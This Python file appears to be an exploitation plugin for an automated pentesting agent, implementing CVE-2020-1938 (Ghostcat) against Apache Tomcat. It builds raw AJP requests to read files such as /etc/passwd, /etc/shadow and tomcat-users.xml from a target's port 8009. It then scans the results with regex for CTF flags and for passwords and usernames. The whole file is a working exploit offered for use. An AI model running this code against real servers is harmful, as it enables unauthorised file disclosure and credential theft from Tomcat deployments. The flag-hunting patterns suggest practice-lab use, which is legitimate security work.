from __future__ import annotations

import socket
import struct
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


class GhostcatEngine(BaseEngine):
    name = "ghostcat"
    description = "CVE-2020-1938 — Apache Tomcat AJP file read via Ghostcat"
    capabilities = ["exploitation", "web", "tomcat"]

    FORWARD_REQUEST = b"\x02"
    CMD_FORWARD_REQUEST = 2

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        port = int(kwargs.get("port", 8009))
        files = kwargs.get("files", [
            "/WEB-INF/web.xml",
            "/WEB-INF/classes/META-INF/context.xml",
            "/etc/passwd",
            "/etc/shadow",
            "/WEB-INF/tomcat-users.xml",
        ])
        timeout_s = int(kwargs.get("timeout", 30))
        findings: list[dict[str, Any]] = []
        raw_parts: list[str] = []

        for fpath in files:
            content = self._read_file(target, port, fpath, timeout_s)
            if content:
                raw_parts.append(f"=== {fpath} ===\n{content[:2000]}")
                findings.append({
                    "tool": self.name,
                    "title": f"Ghostcat: {fpath}",
                    "description": f"Read {fpath} ({len(content)} bytes) from {target}:{port} via CVE-2020-1938",
                    "severity": "critical",
                    "rule_id": f"ghostcat-{fpath.replace('/','-')}",
                    "file_read": fpath,
                    "content_preview": content[:500],
                    "port": port,
                    "cve_id": "CVE-2020-1938",
                })
                self._detect_flags(content, findings)
                self._detect_creds(content, findings)

        if not findings:
            findings.append({
                "tool": self.name,
                "title": "Ghostcat: no files readable",
                "description": f"Could not read any files via AJP on {target}:{port}",
                "severity": "low",
                "rule_id": "ghostcat-no-read",
                "port": port,
            })

        return EngineResult(
            success=len(raw_parts) > 0,
            raw_output="\n".join(raw_parts),
            findings=findings,
            summary=f"Ghostcat: {len(findings)} findings, {len(raw_parts)} files read",
        )

    def _read_file(self, host: str, port: int, fpath: str, timeout_s: int) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout_s)
            sock.connect((host, port))
            data = self._build_forward_request(fpath, "GET")
            sock.send(data)
            resp = sock.recv(4096)
            sock.close()
            return self._parse_ajp_response(resp)
        except Exception:
            return ""

    def _build_forward_request(self, fpath: str, method: str = "GET") -> bytes:
        req = bytearray()
        req.extend(self.FORWARD_REQUEST)

        body = bytearray()
        body.extend(struct.pack(">H", 2))  # METHOD
        body.extend(self._ajp_string(method))
        body.extend(struct.pack(">H", 1))  # PROTOCOL
        body.extend(self._ajp_string("HTTP/1.1"))
        body.extend(struct.pack(">H", 3))  # REQ_URI
        body.extend(self._ajp_string(fpath))
        body.extend(struct.pack(">H", 4))  # REMOTE_ADDR
        body.extend(self._ajp_string(host))
        body.extend(struct.pack(">H", 5))  # AUTH_TYPE
        body.extend(self._ajp_string(""))
        body.extend(struct.pack(">H", 6))  # REMOTE_USER
        body.extend(self._ajp_string(""))
        body.extend(struct.pack(">H", 7))  # CONTENT_TYPE (none for GET)
        body.extend(self._ajp_string("application/x-www-form-urlencoded"))
        body.extend(struct.pack(">H", 8))  # REQ_ATTR
        body.extend(self._ajp_string("javax.servlet.include.request_uri"))
        body.extend(self._ajp_string(fpath))
        body.extend(struct.pack(">H", 9))  # REQ_ATTR_2
        body.extend(self._ajp_string("javax.servlet.include.path_info"))
        body.extend(self._ajp_string(fpath))
        body.extend(struct.pack(">H", 0xFF))  # TERMINATOR

        # Headers
        body.extend(struct.pack(">H", 2))
        body.extend(self._ajp_header("Accept-Language", "en-US"))
        body.extend(self._ajp_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)"))

        length = len(body) + 4
        req.extend(struct.pack(">H", length))
        req.extend(body)
        return bytes(req)

    def _ajp_string(self, s: str) -> bytes:
        encoded = s.encode("utf-8", errors="replace")
        return struct.pack(">H", len(encoded)) + encoded

    def _ajp_header(self, name: str, value: str) -> bytes:
        data = bytearray()
        data.append(0xA0)
        data.extend(self._ajp_string(name))
        data.extend(self._ajp_string(value))
        return bytes(data)

    def _parse_ajp_response(self, raw: bytes) -> str:
        if len(raw) < 8:
            return ""
        data_len = struct.unpack(">H", raw[2:4])[0]
        data = raw[4:4 + data_len]
        content = ""
        i = 0
        while i < len(data) - 1:
            block_type = data[i]
            block_len = struct.unpack(">H", data[i + 1:i + 3])[0]
            if block_type == 3:  # SEND_HEADERS
                pass
            elif block_type == 4:  # SEND_BODY_CHUNK
                chunk = data[i + 3:i + 3 + block_len]
                content += chunk.decode("utf-8", errors="replace")
            elif block_type == 5:  # GET_BODY_CHUNK
                break
            i += 3 + block_len
        return content

    def _detect_flags(self, text: str, findings: list[dict]) -> None:
        import re
        for pattern, pname in [
            (r"flag\{[^}]+\}", "flag"), (r"CTF\{[^}]+\}", "ctf"),
            (r"HTB\{[^}]+\}", "htb"), (r"THM\{[^}]+\}", "thm"),
        ]:
            for m in re.finditer(pattern, text, re.IGNORECASE):
                findings.append({
                    "tool": self.name,
                    "title": f"FLAG via Ghostcat: {m.group()}",
                    "description": f"Flag in AJP file read: {m.group()}",
                    "severity": "critical",
                    "rule_id": f"ghostcat-flag-{pname}",
                    "flag_value": m.group(),
                })

    def _detect_creds(self, text: str, findings: list[dict]) -> None:
        import re
        for m in re.finditer(r"password[=:]\s*(\S+)", text, re.IGNORECASE):
            findings.append({
                "tool": self.name,
                "title": f"Credential found via Ghostcat: password={m.group(1)}",
                "description": f"Password discovered in AJP file read: {m.group(1)}",
                "severity": "critical",
                "rule_id": "ghostcat-cred-password",
                "username": "unknown",
                "password": m.group(1),
            })
        for m in re.finditer(r"username[=:]\s*(\S+)", text, re.IGNORECASE):
            findings.append({
                "tool": self.name,
                "title": f"Username found via Ghostcat: {m.group(1)}",
                "description": f"Username discovered in file read",
                "severity": "high",
                "rule_id": "ghostcat-cred-username",
                "username": m.group(1),
            })

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
